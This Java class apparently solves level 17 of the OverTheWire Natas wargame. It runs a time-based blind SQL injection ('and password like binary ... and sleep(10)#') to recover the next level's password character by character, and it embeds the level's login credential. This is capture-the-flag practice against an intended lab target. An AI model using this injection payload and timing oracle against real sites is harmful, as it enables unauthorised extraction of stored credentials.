package net.leirahjelle.playground;

import org.apache.http.auth.AuthScope;
import org.apache.http.auth.UsernamePasswordCredentials;
import org.apache.http.client.CredentialsProvider;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.utils.URIBuilder;
import org.apache.http.impl.client.BasicCredentialsProvider;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClientBuilder;

import java.time.Clock;
import java.util.stream.IntStream;

public class Natas17 extends NatasLevel {

    @Override
    String findPassword() {
        String allCharacters = fromCharCode(IntStream.rangeClosed(38,127).toArray())
                .replace("%", "")
                .replace("_", "");
        System.out.println("Looping characters: "+allCharacters);

        String password = "x";
        for (int i = 0; i < allCharacters.length(); i++) {
            String attempt = password + allCharacters.charAt(i);
            System.out.print(String.format("\rTesting: %s", attempt));
            if (tryCharacter(attempt)) {
                password = attempt;
                i = 0;
            }
        }
        return password;
    }

    private boolean tryCharacter(String attempt) {
        CredentialsProvider provider = new BasicCredentialsProvider();
        provider.setCredentials(AuthScope.ANY, new UsernamePasswordCredentials("natas17", "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"));
        CloseableHttpClient httpClient = HttpClientBuilder.create()
                .setDefaultCredentialsProvider(provider)
                .build();


        try {
            URIBuilder builder = new URIBuilder("http://natas17.natas.labs.overthewire.org/index.php");
            builder.addParameter("debug", "true");
            builder.addParameter("username", "natas18\" and password like binary '"+ attempt +"%' and sleep(10)#");

            String uri = builder.build().toASCIIString();
//        System.out.println("Testing uri: "+uri);
//        System.out.println("Testing param: "+builder.getQueryParams());
            HttpGet request = new HttpGet(uri);
            Clock clock = Clock.systemUTC();
            Long startTime = clock.millis();

            httpClient.execute(request);

            Long endTime = clock.millis();
            httpClient.close();

            long finishTime = endTime - startTime;
            //        System.out.println(String.format("Finished request in %sms", finishTime));
            return finishTime >= 10 * 1000;
        } catch (Exception exception) {
            throw new RuntimeException("Caught exception during request", exception);
        }
    }
}
